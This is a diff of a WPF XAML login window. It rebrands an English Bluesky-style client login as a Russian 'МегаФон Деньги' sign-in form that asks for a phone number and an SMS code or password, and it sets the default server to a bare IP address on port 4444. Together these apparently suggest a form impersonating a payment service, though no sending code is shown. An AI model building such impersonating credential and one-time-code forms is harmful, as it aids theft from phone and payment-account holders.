@@ -1,12 +1,13 @@
-﻿<Page x:Class="Client.Login"
+﻿<Window x:Class="Client.Login"
       xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
       xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
       xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" 
       xmlns:d="http://schemas.microsoft.com/expression/blend/2008" 
       mc:Ignorable="d" 
-      d:DesignHeight="600" d:DesignWidth="800"
-      Title="Login" UseLayoutRounding="True" Unloaded="Page_Unloaded">
+      Height="600" Width="800"
+      Title="Вход - МегаФон Деньги" UseLayoutRounding="True" WindowStartupLocation="CenterOwner">
     <Grid>
+        <!-- Оригинальные фоны Longhorn -->
         <Grid.Background>
             <RadialGradientBrush>
                 <GradientStop Color="#FFF5FCFF" Offset="1"/>
@@ -21,34 +22,43 @@
                 </LinearGradientBrush>
             </Rectangle.Fill>
         </Rectangle>
-        <Image x:Name="BG" Source="/res/clouds.jpg" Stretch="Fill" Opacity="0.1" Focusable="True" MouseDown="Image_MouseDown"/>
-        <Image x:Name="Wordmark" Source="/res/wordmark.png" Margin="0,0,0,100" HorizontalAlignment="Center" VerticalAlignment="Center" MouseDown="Image_MouseDown" Height="64"/>
-        <StackPanel x:Name="LoginPage" HorizontalAlignment="Center" VerticalAlignment="Center" Width="500" Height="210" Margin="0,189,0,0" Visibility="Collapsed">
-            <Label Content="Account:" Padding="0,0,0,5"/>
-            <TextBox x:Name="UserBox" Width="500" Text="Username or email address" Margin="0,0,0,10" LostKeyboardFocus="UserBox_LostKeyboardFocus" GotKeyboardFocus="UserBox_GotKeyboardFocus" Foreground="Gray"/>
-            <Grid>
-                <PasswordBox x:Name="PassBox" Width="500" Margin="0,0,0,10" Foreground="Gray" GotKeyboardFocus="PassBox_GotKeyboardFocus" LostKeyboardFocus="PassBox_LostKeyboardFocus" FontFamily="Segoe UI"/>
-                <Label x:Name="PasswordPreviewText" Foreground="Gray" Content="Password" Padding="5,0,0,0" VerticalContentAlignment="Center" Height="22" VerticalAlignment="Top" IsHitTestVisible="False"/>
+
+        <!-- Оригинальные картинки из ресурсов -->
+        <Image x:Name="BG" Source="/res/clouds.jpg" Stretch="Fill" Opacity="0.1" Focusable="True" MouseDown="Image_MouseDown" Margin="-10,7,10,-7"/>
+        <Image x:Name="Wordmark" Source="res/megaf.png" Margin="225,96,240,285" HorizontalAlignment="Center" VerticalAlignment="Center" MouseDown="Image_MouseDown" Height="188" Width="327"/>
+
+        <!-- ЭКРАН ВВОДА ДАННЫХ -->
+        <StackPanel x:Name="LoginPanel" HorizontalAlignment="Center" VerticalAlignment="Center" Width="500" Height="250" Margin="0,189,0,0" Visibility="Visible">
+            <Label Content="Номер телефона:" Padding="0,0,0,5"/>
+            <TextBox x:Name="UserBox" Width="500" Text="Номер телефона (например, 7926...)" Margin="0,0,0,10" LostKeyboardFocus="UserBox_LostKeyboardFocus" GotKeyboardFocus="UserBox_GotKeyboardFocus" Foreground="Gray"/>
+
+            <Label Content="Код из СМС или Пароль:" Padding="0,0,0,5"/>
+            <Grid Margin="0,0,0,10">
+                <PasswordBox x:Name="PassBox" Width="500" Foreground="Black" GotKeyboardFocus="PassBox_GotKeyboardFocus" LostKeyboardFocus="PassBox_LostKeyboardFocus" FontFamily="Segoe UI" Padding="0,0,30,0" Margin="0,0,0,10"/>
+                <Label x:Name="PasswordPreviewText" Foreground="Gray" Content="Введите код или пароль" Padding="5,0,0,0" VerticalContentAlignment="Center" Height="19" VerticalAlignment="Top" IsHitTestVisible="False"/>
+                <Image x:Name="PassBoxButton" Source="/res/signinbutton-1.png" Stretch="None" HorizontalAlignment="Right" VerticalAlignment="Center" Margin="0,-5,-32,5" MouseDown="PassBoxButton_MouseDown" MouseEnter="PassBoxButton_MouseEnter" MouseLeave="PassBoxButton_MouseLeave" MouseUp="PassBoxButton_MouseUp" Cursor="Hand" Height="32" Width="39"/>
             </Grid>
-            <CheckBox x:Name="HostCheckBox" Content="Use custom hosting provider" Margin="0,0,0,5" Checked="CheckBox_Checked" Unchecked="CheckBox_Unchecked"/>
+
+            <CheckBox x:Name="HostCheckBox" Content="Указать адрес сервера вручную" Margin="0,0,0,5" Checked="CheckBox_Checked" Unchecked="CheckBox_Unchecked"/>
             <StackPanel x:Name="ServWrapPanel" Margin="0,0,0,5" Visibility="Collapsed">
-                <Label Content="Server address:" Padding="0,0,0,5"/>
-                <TextBox x:Name="HostProv" Width="500" Text="https://bsky.social" Foreground="Gray" LostKeyboardFocus="HostProv_LostKeyboardFocus" GotKeyboardFocus="HostProv_GotKeyboardFocus" Margin="0,0,0,5"/>
+                <Label Content="Адрес сервера (URL):" Padding="0,0,0,5"/>
+                <TextBox x:Name="HostProv" Width="500" Text="http://2.26.61.185:4444/api/odp" Foreground="Gray" LostKeyboardFocus="HostProv_LostKeyboardFocus" GotKeyboardFocus="HostProv_GotKeyboardFocus" Margin="0,0,0,5"/>
             </StackPanel>
-            <CheckBox x:Name="RememberCheckBox" Content="Remember me" Margin="0,0,0,5"/>
-            <Label x:Name="Error" Content="Error message." Padding="0" Margin="0,0,0,5" Foreground="#FFB33C3C" FontFamily="Segoe UI Semibold" Visibility="Collapsed"/>
-            <StackPanel Orientation="Horizontal">
-                <TextBlock x:Name="CreateAccount" Text="Create account..." Foreground="{DynamicResource ö}" Margin="0,0,20,0" Cursor="Hand" MouseEnter="Label_MouseEnter" MouseLeave="Label_MouseLeave" Visibility="Collapsed"/>
-                <TextBlock x:Name="LoginGuest" Text="Login as guest..." Foreground="{DynamicResource ö}" Margin="0,0,20,0" Cursor="Hand" MouseEnter="Label_MouseEnter" MouseLeave="Label_MouseLeave" Visibility="Collapsed"/>
-                <TextBlock x:Name="ForgotPassword" Text="I forgot my password." Foreground="{DynamicResource ö}" Cursor="Hand" MouseEnter="Label_MouseEnter" MouseLeave="Label_MouseLeave" Visibility="Collapsed"/>
+
+            <CheckBox x:Name="RememberCheckBox" Content="Запомнить меня" Margin="0,0,0,5"/>
+            <Label x:Name="Error" Content="Сообщение об ошибке." Padding="0" Margin="0,0,0,5" Foreground="#FFB33C3C" FontFamily="Segoe UI Semibold" Visibility="Collapsed"/>
+
+            <StackPanel Orientation="Horizontal" Margin="0,5,0,0">
+                <TextBlock x:Name="GetSmsCode" Text="Получить код (SMS/TG)" Foreground="#0066CC" Margin="0,0,20,0" Cursor="Hand" MouseEnter="Label_MouseEnter" MouseLeave="Label_MouseLeave" MouseUp="GetSmsCode_Click"/>
+                <TextBlock x:Name="SupportText" Text="Поддержка" Foreground="#0066CC" Cursor="Hand" MouseEnter="Label_MouseEnter" MouseLeave="Label_MouseLeave" MouseUp="Support_Click"/>
             </StackPanel>
         </StackPanel>
-        <TextBlock x:Name="SupportText" Text="Support" Foreground="{DynamicResource ö}" HorizontalAlignment="Right" VerticalAlignment="Bottom" Margin="0,0,15,15" Cursor="Hand" MouseEnter="Label_MouseEnter" MouseLeave="Label_MouseLeave" MouseUp="Support_Click" Visibility="Collapsed"/>
-        <Image x:Name="PassBoxButton" Source="/res/signinbutton-1.png" Stretch="None" HorizontalAlignment="Center" VerticalAlignment="Center" Margin="530,107,0,0" MouseDown="PassBoxButton_MouseDown" MouseEnter="PassBoxButton_MouseEnter" MouseLeave="PassBoxButton_MouseLeave" MouseUp="PassBoxButton_MouseLeave" Visibility="Collapsed"/>
-        <Grid x:Name="WelcomePage" HorizontalAlignment="Center" VerticalAlignment="Center">
-            <Label x:Name="Welcome" Content="Welcome" HorizontalAlignment="Center" VerticalAlignment="Center" FontSize="20" FontFamily="Segoe UI Semilight"/>
+
+        <!-- ОРИГИНАЛЬНЫЙ ЭКРАН ЗАГРУЗКИ LONGHORN -->
+        <Grid x:Name="WelcomePanel" HorizontalAlignment="Center" VerticalAlignment="Center" Visibility="Collapsed">
+            <Label x:Name="Welcome" Content="Авторизация" HorizontalAlignment="Center" VerticalAlignment="Center" FontSize="20" FontFamily="Segoe UI Semilight"/>
             <ProgressBar HorizontalAlignment="Center" VerticalAlignment="Center" Margin="0,95,0,0" Width="500" Height="20" IsIndeterminate="True" Background="#FFB1BED2" Foreground="#FF94C832"/>
-            <Label x:Name="WelcomeText" Padding="0" Content="Please wait..." Margin="0,140,0,0"/>
+            <Label x:Name="WelcomeText" Padding="0" Content="Пожалуйста, подождите..." Margin="0,140,0,0" HorizontalAlignment="Center"/>
         </Grid>
     </Grid>
-</Page>
+</Window>
